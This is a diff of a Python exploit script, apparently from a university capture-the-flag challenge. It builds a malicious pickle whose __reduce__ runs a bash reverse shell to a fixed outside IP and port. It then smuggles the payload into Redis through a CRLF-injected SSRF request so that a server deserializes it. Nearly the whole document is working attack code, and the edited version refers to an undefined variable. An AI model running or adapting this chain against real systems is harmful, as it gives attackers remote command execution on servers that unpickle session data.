@@ -2,15 +2,19 @@
 import urllib, requests, socket
 import os
 import pickle, redis
-#-------------OK---------------#
+
+class shell_class(object):
+    def __reduce__(self):
+        reverse_shell = "bash -c 'bash -i >& /dev/tcp/140.112.90.24/9527 0>&1'"
+        return (os.system, (reverse_shell, ))
+
+sh = shell_class()
+sh_serial = pickle.dumps(sh)
+sh_serial = str(sh_serial)[1:]
+sh_serial = urllib.parse.quote(sh_serial)
+print(sh_serial)
+
 # send payload
-url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:e05097b2-fece-466f-b1be-a49909eda558" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c \'bash -i >%26 /dev/tcp/140.112.90.24/9527 0>%261\'q\x01\x85q\x02Rq\x03."%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
-
-r = requests.post('https://edu-ctf.csie.org:10163', data={'url': url_post}, verify=False)
-print(r.status_code, r.text)
-
-# make payload to db
-r2 = requests.get(r.text, verify=False)
-print(r2.status_code, r2.text)
-
-print('visit [%s] in broewer with session ID [%s] for reverse shell' % (r.text, "session:e05097b2-fece-466f-b1be-a49909eda558"))
+p = 'http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:ffab9582-1ec5-461b-af2e-15621b9b4d67" ' + sh_serial + '%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
+print('palyload for hackbar [  url=%s  ]' % (p))
+print('visit [  %s  ] in broewer with session ID NOT EQUAL [  %s  ] for reverse shell' % (r.text, "session:ffab9582-1ec5-461b-af2e-15621b9b4d67"))
